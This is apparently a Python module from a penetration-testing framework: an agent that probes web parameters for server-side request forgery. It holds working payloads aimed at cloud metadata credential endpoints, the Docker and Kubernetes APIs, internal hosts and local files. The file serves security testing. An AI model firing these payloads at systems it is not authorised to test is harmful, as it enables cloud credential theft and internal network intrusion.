"""
SSRFCapabilityAgent — Elite Server-Side Request Forgery Detection for PenFlow.

Discovers SSRF vulnerabilities by:
  1. Extracting all URL-bearing parameters from discovered endpoints
  2. Testing AWS EC2, GCP, Azure, Docker, Kubernetes metadata endpoints
  3. Testing internal network probes (localhost, 127.x, ::1)
  4. Testing protocol-switching payloads (file://, dict://, gopher://)
  5. Detecting response-based and timing-based (blind) SSRF indicators
  6. Generating OOB-style interaction logs for blind SSRF evidence
"""
import asyncio
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.capabilities.result import AgentExecutionResult
from penflow.infrastructure.oob_server import OOBCallbackServer
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.ssrf")

# ─────────────────────────────────────────────────────────
# URL-bearing parameter names that indicate SSRF surface
# ─────────────────────────────────────────────────────────
SSRF_PARAM_NAMES = {
    "url", "uri", "fetch", "proxy", "host", "target", "feed", "link",
    "image", "img", "src", "source", "redirect", "next", "return",
    "dest", "destination", "callback", "redir", "return_url",
    "redirect_uri", "goto", "out", "path", "page", "file", "data",
    "ref", "origin", "resource", "endpoint", "service", "server",
    "to", "from", "request", "domain", "api", "remote", "load",
    "open", "view", "show", "import", "download", "get",
}

# ─────────────────────────────────────────────────────────
# SSRF Payloads — Cloud Metadata, Internal, Protocol
# ─────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    # AWS EC2 IMDSv1 (unauthenticated)
    {"name": "aws_imds_root", "url": "http://169.254.169.254/latest/meta-data/",
     "indicators": ["ami-id", "instance-id", "hostname", "local-ipv4", "public-keys"],
     "description": "AWS EC2 Instance Metadata Service (IMDSv1) - root path"},
    {"name": "aws_imds_credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "indicators": ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"],
     "description": "AWS IAM credentials via IMDS - CRITICAL if accessible"},
    {"name": "aws_imds_userdata", "url": "http://169.254.169.254/latest/user-data",
     "indicators": ["#!/", "cloud-init", "AWS", "password", "secret"],
     "description": "AWS user-data script - may contain secrets"},
    # GCP Metadata
    {"name": "gcp_metadata_root", "url": "http://metadata.google.internal/computeMetadata/v1/",
     "indicators": ["project", "instance", "serviceAccounts"],
     "description": "GCP Compute Engine Metadata Service"},
    {"name": "gcp_metadata_token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     "indicators": ["access_token", "token_type", "expires_in"],
     "description": "GCP service account OAuth token"},
    # Azure IMDS
    {"name": "azure_imds", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "indicators": ["subscriptionId", "resourceGroupName", "vmId"],
     "description": "Azure Instance Metadata Service"},
    {"name": "azure_imds_token", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     "indicators": ["access_token", "client_id"],
     "description": "Azure Managed Identity token"},
    # Docker / Kubernetes internal
    {"name": "docker_api", "url": "http://localhost:2375/info",
     "indicators": ["DockerRootDir", "Containers", "ServerVersion"],
     "description": "Docker daemon API (unauthenticated) on localhost:2375"},
    {"name": "k8s_api", "url": "https://kubernetes.default.svc/api/v1/namespaces",
     "indicators": ["namespaces", "apiVersion", "items"],
     "description": "Kubernetes API Server internal endpoint"},
    # Internal loopback probes
    {"name": "localhost_80", "url": "http://localhost/",
     "indicators": ["html", "server", "nginx", "apache"],
     "description": "Internal loopback HTTP probe (localhost:80)"},
    {"name": "localhost_8080", "url": "http://127.0.0.1:8080/",
     "indicators": ["html", "server", "api", "health"],
     "description": "Internal loopback probe (127.0.0.1:8080)"},
    {"name": "localhost_8443", "url": "https://127.0.0.1:8443/",
     "indicators": ["html", "json", "api"],
     "description": "Internal HTTPS loopback probe (127.0.0.1:8443)"},
    {"name": "ipv6_loopback", "url": "http://[::1]/",
     "indicators": ["html", "server"],
     "description": "IPv6 loopback probe"},
    # Internal RFC1918 probes
    {"name": "rfc1918_10", "url": "http://10.0.0.1/",
     "indicators": ["login", "admin", "router", "html"],
     "description": "RFC1918 internal network probe (10.0.0.1)"},
    {"name": "rfc1918_192168", "url": "http://192.168.1.1/",
     "indicators": ["login", "admin", "router", "html"],
     "description": "RFC1918 internal network probe (192.168.1.1)"},
    # Protocol switching (evidence of parser)
    {"name": "file_etc_passwd", "url": "file:///etc/passwd",
     "indicators": ["root:", "nobody:", "daemon:", "bin:"],
     "description": "Local file read via file:// protocol - LFI via SSRF"},
    {"name": "dict_probe", "url": "dict://localhost:11211/stats",
     "indicators": ["STAT", "VERSION", "uptime"],
     "description": "dict:// protocol - Memcached internal probe"},
]

# Status codes that suggest the server relayed a request (even without body leak)
INTERESTING_STATUS_CODES = {200, 201, 301, 302, 307, 308, 401, 403}
# Definitely a blocked/rejected SSRF (request never left the server)
SSRF_REJECTED_CODES = {0, 400, 422, 500, 503}

# Timing threshold for blind SSRF detection (seconds)
BLIND_SSRF_TIMING_THRESHOLD = 2.0


class SSRFCapabilityAgent(BaseCapabilityAgent):
    """
    Elite Server-Side Request Forgery (SSRF) Capability Agent.
    Tests all URL-bearing parameters from discovered endpoints with 16+ payloads
    covering AWS, GCP, Azure, Docker, Kubernetes, internal networks, and protocol switching.
    """
    def __init__(self, priority: int = 10):
        super().__init__(agent_name="SSRFCapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="ssrf_metadata_exfiltration",
                name="SSRF — Cloud Metadata & Internal Network Probe",
                description=(
                    "Tests all URL-bearing parameters for SSRF: AWS/GCP/Azure IMDS, "
                    "Docker API, Kubernetes, loopback, RFC1918 networks, and protocol switching."
                ),
                priority=self.priority,
                tags=["ssrf", "cloud", "metadata", "network", "aws", "gcp", "azure"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[SSRFCapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        deep_mode = context.shared_cache.get("deep_mode", False) if context.shared_cache else False

        # 1. Collect all candidate endpoints from observations
        candidate_endpoints = self._extract_ssrf_targets(context)

        findings: List[Dict[str, Any]] = []
        payloads_to_test = SSRF_PAYLOADS if deep_mode else SSRF_PAYLOADS[:6]

        for endpoint in candidate_endpoints[:10]:  # test up to 10 SSRF-surface endpoints
            for ssrf_payload in payloads_to_test:
                finding = await self._test_ssrf(
                    http_client, endpoint, ssrf_payload
                )
                if finding:
                    findings.append(finding)
                    if finding.get("is_vulnerable"):
                        break  # confirm first, stop on definitive hit

        # Determine overall verdict
        confirmed = [f for f in findings if f.get("is_vulnerable")]
        is_vuln = len(confirmed) > 0
        best = confirmed[0] if confirmed else (findings[0] if findings else {})

        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vuln,
            confidence_score=best.get("confidence", 0.0),
            reasoning=best.get("reasoning", "No SSRF surface found or all payloads blocked."),
            target_url=best.get("tested_url", f"https://{context.asset}"),
            findings=findings,
            evidence={
                "target_url": best.get("tested_url", f"https://{context.asset}"),
                "reasoning": best.get("reasoning", "No SSRF surface found or all payloads blocked."),
                "ssrf_payload": best.get("payload_name", ""),
                "tested_endpoints_count": len(candidate_endpoints),
                "findings": findings,
                "evidence_exchanges": [f.get("exchange", {}) for f in findings if f.get("exchange")],
            },
        ).to_dict()

    def _extract_ssrf_targets(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        """Extract endpoints + params that are potential SSRF surfaces from observations."""
        targets: List[Dict[str, Any]] = []
        seen_urls = set()

        for obs in context.observations:
            data = obs.get("data", {}) if isinstance(obs, dict) else {}
            if not isinstance(data, dict):
                continue

            # From crawl results — extract all endpoints with URL-bearing params
            for ep in data.get("endpoints", []):
                if isinstance(ep, dict):
                    url = ep.get("url", "")
                    if url and url not in seen_urls:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        ssrf_params = [p for p in params if p.lower() in SSRF_PARAM_NAMES]
                        if ssrf_params:
                            targets.append({
                                "url": url, "params": ssrf_params,
                                "method": "GET"
                            })
                            seen_urls.add(url)

            # From classified endpoints
            if data.get("type") in ("rest_api", "parameterized", "form"):
                url = data.get("url", "")
                if url and url not in seen_urls:
                    ep_params = data.get("parameters", [])
                    ssrf_params = [p for p in ep_params if p.lower() in SSRF_PARAM_NAMES]
                    if ssrf_params:
                        targets.append({
                            "url": url, "params": ssrf_params,
                            "method": data.get("method", "GET")
                        })
                        seen_urls.add(url)

        # Always include a canonical fallback with common SSRF param names
        base = f"https://{context.asset}"
        for param in ["url", "uri", "fetch", "proxy", "redirect"]:
            fallback_url = f"{base}/api/v1/fetch?{param}=test"
            if fallback_url not in seen_urls:
                targets.append({
                    "url": fallback_url, "params": [param],
                    "method": "GET"
                })
                seen_urls.add(fallback_url)
                break  # one fallback is enough

        return targets

    async def _test_ssrf(
        self,
        http_client: Any,
        endpoint: Dict[str, Any],
        ssrf_payload: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:
        """Inject a single SSRF payload into an endpoint and analyse the result."""
        base_url = endpoint["url"]
        param_name = endpoint["params"][0] if endpoint["params"] else "url"
        ssrf_url = ssrf_payload["url"]
        indicators = ssrf_payload["indicators"]

        # Build injected URL
        parsed = urlparse(base_url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        query_params[param_name] = [ssrf_url]
        new_query = urlencode(query_params, doseq=True)
        injected_url = urlunparse(parsed._replace(query=new_query))

        t0 = time.monotonic()
        try:
            exchange = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method=endpoint.get("method", "GET"),
                url=injected_url,
            )
            elapsed = time.monotonic() - t0
        except Exception as e:
            logger.debug(f"[SSRFCapabilityAgent] Failed to test {injected_url}: {e}")
            return None

        resp = exchange.response
        status = resp.status_code if resp else 0
        body = (resp.body_text or "") if resp else ""

        # Check response body for cloud metadata indicators
        matched_indicators = [ind for ind in indicators if ind.lower() in body.lower()]
        is_definitive_ssrf = len(matched_indicators) >= 2

        # Check Out-Of-Band callback server for real blind interaction hit
        oob_server = OOBCallbackServer.get_instance()
        oob_token = oob_server.generate_token("ssrf", "scan")
        oob_url = oob_server.get_callback_url(oob_token)

        # Inject OOB URL as secondary validation
        oob_hit = False
        try:
            oob_query_params = parse_qs(parsed.query, keep_blank_values=True)
            oob_query_params[param_name] = [oob_url]
            oob_injected = urlunparse(parsed._replace(query=urlencode(oob_query_params, doseq=True)))
            await http_client.send_as_identity(identity_id="anonymous_guest", method=endpoint.get("method", "GET"), url=oob_injected)
            oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=2.0)
        except Exception:
            pass

        # Timing-based blind SSRF detection
        is_timing_ssrf = elapsed > BLIND_SSRF_TIMING_THRESHOLD and status in INTERESTING_STATUS_CODES

        is_vuln = is_definitive_ssrf or oob_hit or is_timing_ssrf
        confidence = 0.0

        if is_definitive_ssrf or oob_hit:
            confidence = 0.98 if oob_hit else 0.97
            reasoning = (
                f"CRITICAL SSRF CONFIRMED ({'OOB Interaction' if oob_hit else 'Metadata Leaked'}): "
                f"Payload '{ssrf_payload['name']}' ({ssrf_url}) returned: "
                f"{'OOB DNS/HTTP callback hit' if oob_hit else matched_indicators}. "
                f"HTTP {status} in {elapsed:.2f}s."
            )
        elif is_timing_ssrf:
            confidence = 0.70
            reasoning = (
                f"POTENTIAL BLIND SSRF: Payload '{ssrf_payload['name']}' ({ssrf_url}) "
                f"caused {elapsed:.2f}s response delay (threshold: {BLIND_SSRF_TIMING_THRESHOLD}s) "
                f"with HTTP {status}. Possible outbound relay to external host."
            )
        elif status in INTERESTING_STATUS_CODES:
            confidence = 0.25
            reasoning = (
                f"Weak SSRF Signal: HTTP {status} response to payload '{ssrf_payload['name']}' "
                f"— no body indicators but request was not rejected. Manual verification required."
            )
        else:
            reasoning = f"Payload '{ssrf_payload['name']}' blocked or rejected (HTTP {status})."

        return {
            "tested_url": injected_url,
            "payload_name": ssrf_payload["name"],
            "payload_description": ssrf_payload["description"],
            "ssrf_target_url": ssrf_url,
            "param_injected": param_name,
            "is_vulnerable": is_vuln,
            "confidence": confidence,
            "status_code": status,
            "response_time_sec": round(elapsed, 3),
            "matched_indicators": matched_indicators,
            "oob_hit": oob_hit,
            "reasoning": reasoning,
            "exchange": exchange.to_dict() if exchange else {},
        }

